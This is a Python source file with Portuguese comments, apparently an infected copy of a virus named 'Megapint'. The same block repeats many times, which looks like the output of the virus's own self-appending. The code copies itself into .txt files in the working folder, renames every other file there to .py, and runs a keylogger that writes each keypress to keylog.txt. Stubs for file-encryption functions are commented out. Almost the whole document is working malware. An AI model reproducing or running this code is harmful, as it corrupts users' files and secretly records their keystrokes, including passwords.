    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
